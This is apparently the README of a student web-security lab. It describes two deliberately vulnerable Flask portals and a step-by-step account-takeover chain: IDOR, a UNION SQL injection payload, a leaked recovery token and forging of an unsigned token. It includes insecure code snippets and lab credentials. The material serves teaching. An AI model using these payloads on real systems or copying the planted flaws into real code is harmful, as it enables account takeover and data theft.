# Fort Knox — TP Seguridad Web (K5061)

Laboratorio de cadena de ataque sobre dos portales web vulnerables de una joyeria ficticia.
UTN FRBA - Grupo 4 - 2026

---

## Cadena de ataque

```
Paso 1 — A01: IDOR / BOLA          Portal de Seguimiento (5001)
  GET /tracking?shipment_id=692
  -> sin verificacion de ownership, devuelve datos del destinatario:
     nombre + ID de cliente ofuscado de la victima (204815). Sin email.

Paso 2 — A05: SQL Injection         Portal de Seguimiento (5001)
  GET /support/search?user_id=204815 UNION SELECT id,username,last_name FROM users WHERE id=204815--
  -> extrae el username de la victima: "carlos_gomez" (aparece en la columna Nombre)
  (requiere cookie SSO del portal de clientes)

Paso 3 — A02: Security Misconfiguration   Portal de Clientes (5000)
  POST /account/recover  { username: "carlos_gomez" }
  -> la respuesta incluye debug_token con el token de recuperacion en texto claro

Paso 4 — A08: Token Tampering       Portal de Clientes (5000)
  Decodifica el token (base64url JSON sin firma),
  cambia authorized_email al email del atacante,
  re-codifica y visita /account/confirm-recovery?token=<tampered>
  -> acceso total a la cuenta de carlos_gomez
```

---

## Estructura del proyecto

```
JoyeriaFortKnox/
├── docker-compose.yml
├── tracking/                   <- Portal de Seguimiento de Envios (puerto 5001)
│   ├── app.py
│   ├── seed.py
│   ├── requirements.txt
│   ├── Dockerfile
│   ├── tracking.db             <- generado por seed.py (no commitear)
│   └── templates/
│       ├── base.html
│       ├── index.html          <- landing: busqueda publica por email
│       ├── tracking.html       <- detalle de envio (VULNERABLE: IDOR A01)
│       ├── support.html        <- busqueda interna por user_id (VULNERABLE: SQLi A05)
│       └── login.html          <- pantalla sin cookie SSO
└── clientes/                   <- Portal de Clientes (puerto 5000)
    ├── app.py
    ├── seed.py
    ├── requirements.txt
    ├── Dockerfile
    ├── clientes.db             <- generado por seed.py (no commitear)
    └── templates/
        ├── base.html
        ├── login.html          <- login con usuario/password
        ├── dashboard.html      <- pedidos del cliente
        ├── recover.html        <- formulario de recuperacion
        ├── recover_sent.html   <- VULNERABLE: A02, muestra debug_token
        └── confirm_recovery.html <- VULNERABLE: A08, acepta token sin firma
```

---

## Bases de datos

Cada portal tiene su propia base de datos SQLite independiente, generada por su `seed.py`.

### clientes/clientes.db

| Tabla    | Campos clave                                                                     |
|----------|----------------------------------------------------------------------------------|
| `users`  | id, username, **password** (texto claro), email, first_name, last_name          |
| `orders` | id, user_id (FK), order_number, product_name, amount, status, created_at        |

### tracking/tracking.db

| Tabla       | Campos clave                                                                          |
|-------------|---------------------------------------------------------------------------------------|
| `users`     | id, username, email, first_name, last_name (**sin password**)                        |
| `shipments` | id, shipment_id (unico), user_id (FK), order_number, status, destination, estimated_delivery |

> Los usernames son iguales en ambas DBs (`carlos_gomez`, `attacker`, etc.) — esto es lo que permite el SSO compartido.

---

## Requisitos

- Python 3.10+ **o** Docker + Docker Compose

---

## Correr los portales

### Opcion A — Docker (recomendado)

Levanta ambos portales de una sola vez. Cada contenedor corre `seed.py` al arrancar.

```bash
docker compose up --build
```

- Portal de Clientes    -> http://localhost:5000
- Portal de Seguimiento -> http://localhost:5001

### Opcion B — Local (dos terminales)

**Terminal 1 — Portal de Clientes (arrancar primero)**

```bash
cd clientes

python -m pip install flask    # solo la primera vez
python seed.py                 # solo la primera vez — crea clientes/clientes.db
python app.py                  # inicia en http://localhost:5000
```

**Terminal 2 — Portal de Seguimiento**

```bash
cd tracking

python -m pip install flask    # solo la primera vez
python seed.py                 # solo la primera vez — crea tracking/tracking.db
python app.py                  # inicia en http://localhost:5001
```

---

## Ejecutar el ataque (paso a paso)

### Setup: el atacante se loguea en su propia cuenta

```
http://localhost:5000/login
  usuario:    attacker
  contrasena: FK2026!
```

Esto crea la cookie SSO `fk_session` que tambien es valida en el portal de seguimiento.

---

### Paso 1 — IDOR: ver el envio de la victima

El atacante recibio el link de su propio envio:
```
http://localhost:5001/tracking?shipment_id=666
```

Prueba otros IDs por fuerza bruta (barrido desde 666 hacia arriba) y encuentra el de la victima:
```
http://localhost:5001/tracking?shipment_id=692
```

**Resultado:** el servidor devuelve los datos de Carlos Gomez sin verificar ownership.

| Campo         | Valor obtenido    |
|---------------|-------------------|
| Nombre        | Carlos Gomez      |
| ID de cliente | `204815`          |
| Orden         | ORD-2026-1001     |

> El detalle del envio **no expone el email** del cliente — solo el ID de cliente
> (ofuscado, no enumerable). Ese ID es el dato que habilita el Paso 2.

**Por que funciona:** el endpoint valida el token SSO pero no compara el `user_id` del envio
con el `user_id` de la sesion activa. Solo busca en la DB por `shipment_id`.

---

### Paso 2 — SQL Injection: extraer el username

Con el `ID de cliente: 204815` obtenido en el paso anterior, el atacante va al buscador interno de soporte:

Consulta normal:
```
http://localhost:5001/support/search?user_id=204815
```
Devuelve: ID=204815, Nombre=Carlos, Apellido=Gomez (sin email ni username)

Ahora inyecta en el parametro `user_id`:
```
204815 UNION SELECT id,username,last_name FROM users WHERE id=204815--
```

URL completa:
```
http://localhost:5001/support/search?user_id=204815 UNION SELECT id,username,last_name FROM users WHERE id=204815--
```

**Resultado:** aparece una segunda fila con `carlos_gomez` en la columna **Nombre**.

**Por que funciona:** el backend concatena el parametro directamente en la query:
```python
query = f"SELECT u.id, u.first_name, u.last_name FROM users WHERE u.id = {user_id}"
```
El `UNION SELECT` se ejecuta como SQL valido. No hay passwords en esta tabla,
la inyeccion solo expone el username — suficiente para el paso siguiente.

---

### Paso 3 — A02: obtener el token de recuperacion

El atacante pide recuperacion para la cuenta de Carlos:
```
POST http://localhost:5000/account/recover
  username=carlos_gomez
```

**Resultado:** la respuesta HTML incluye un bloque de debug con el token en claro:
```
[DEBUG] recovery_token: eyJ1c2VyIjogImNhcmxvc19nb21leiIsICJhdXRob3JpemVkX2VtYWls...
```

**Por que funciona:** el desarrollador dejo un campo de debug en la respuesta.
En produccion, ese token solo deberia enviarse por email al dueno de la cuenta.

---

### Paso 4 — A08: tamper del token -> acceso total

El token es JSON codificado en base64url, sin ninguna firma ni HMAC.

Decodificar:
```
base64url.decode(token)
-> {"user": "carlos_gomez", "authorized_email": "carlos.gomez@gmail.com", "exp": "..."}
```

Cambiar `authorized_email` al email del atacante y re-codificar:
```
{"user": "carlos_gomez", "authorized_email": "attacker@mailinator.com", "exp": "..."}
-> <nuevo_token_base64>
```

Visitar la URL de confirmacion con el token modificado:
```
http://localhost:5000/account/confirm-recovery?token=<nuevo_token_base64>
```

**Resultado:** el servidor acepta el token, actualiza el email de Carlos al del atacante,
y abre sesion como `carlos_gomez`. Acceso total a la cuenta de la victima.

**Por que funciona:** el endpoint decodifica el base64 sin verificar ninguna firma:
```python
payload = json.loads(base64.urlsafe_b64decode(token))  # sin HMAC check
```

---

## Usuarios de prueba

### Portal de Clientes (clientes.db)

| Usuario        | Password | Email                    | Rol      |
|----------------|----------|--------------------------|----------|
| `carlos_gomez` | FK2026!  | carlos.gomez@gmail.com   | Victima  |
| `ana_martinez` | FK2026!  | ana.martinez@hotmail.com | —        |
| `lucia_perez`  | FK2026!  | lucia.perez@yahoo.com    | —        |
| `attacker`     | FK2026!  | attacker@mailinator.com  | Atacante |

### Portal de Seguimiento (tracking.db)

| Usuario        | Email                    | ID de cliente | shipment_id | Rol      |
|----------------|--------------------------|---------------|-------------|----------|
| `carlos_gomez` | carlos.gomez@gmail.com   | 204815        | 692         | Victima  |
| `ana_martinez` | ana.martinez@hotmail.com | 119273        | 759         | —        |
| `lucia_perez`  | lucia.perez@yahoo.com    | 387640        | 481         | —        |
| `attacker`     | attacker@mailinator.com  | 256108        | 666         | Atacante |

---

## Mecanismo SSO

Ambos portales comparten `secret_key = 'fortknox-sso-shared-secret-2026'`
y el nombre de cookie `fk_session`. Los navegadores envian cookies de `localhost`
sin distinguir por puerto, por lo que la sesion creada al loguearse en el puerto 5000
es automaticamente valida en el portal de seguimiento en el puerto 5001.
